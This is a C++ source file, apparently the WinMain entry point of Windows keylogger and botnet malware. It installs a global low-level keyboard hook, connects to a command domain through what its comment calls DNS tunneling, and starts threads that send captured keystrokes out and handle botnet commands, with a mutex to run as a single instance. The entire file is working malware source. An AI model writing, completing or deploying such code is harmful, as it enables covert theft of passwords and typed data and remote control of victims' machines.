#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Network.h"
#include "KeyLogger.h"
#include <iostream>

#include "ConsoleClient.h"
#include "Shell.h"

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance,
                   _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
    
    HANDLE mutex = CreateMutex(nullptr, TRUE, MUTEX_NAME);
    if (!mutex) {
        return FALSE;
    }
    
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(mutex);
        return TRUE;
    }
    
    // Establish connection via DNS tunneling
    int retryCount = 0;
    while ((connectionId = startConnection(TARGET_DOMAIN.c_str())) == -1) {
        retryCount++;
        Sleep(2000);
        
        if (retryCount > 10) {
            CloseHandle(mutex);
            return FALSE;
        }
    }
    
    // Install global keyboard hook
    _k_hook = SetWindowsHookEx(WH_KEYBOARD_LL, process_key, nullptr, 0);
    if (!_k_hook) {
        CloseHandle(mutex);
        return FALSE;
    }
    
    keyboardLayout = GetKeyboardLayout(0);
    
    // Start sender thread for async data transmission
    HANDLE hSenderThread = CreateThread(nullptr, 0, senderThread, nullptr, 0, nullptr);
    if (!hSenderThread) {
        UnhookWindowsHookEx(_k_hook);
        CloseHandle(mutex);
        return FALSE;
    }
    HANDLE hSenderBotnetThread = CreateThread(nullptr, 0, senderBotnetThread, nullptr, 0, nullptr);
    HANDLE hExecThread = CreateThread(nullptr, 0, handle_botnet, nullptr, 0, nullptr);
    // Message loop - keeps the hook active
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    
    // Cleanup
    shouldStopSender = true;
    if (hSenderThread) {
        WaitForSingleObject(hSenderThread, 5000);  
        CloseHandle(hSenderThread);
    }
    
    if (_k_hook) {
        UnhookWindowsHookEx(_k_hook);
    }
    
    if (mutex) {
        CloseHandle(mutex);
    }
    
    return static_cast<int>(msg.wParam);
}
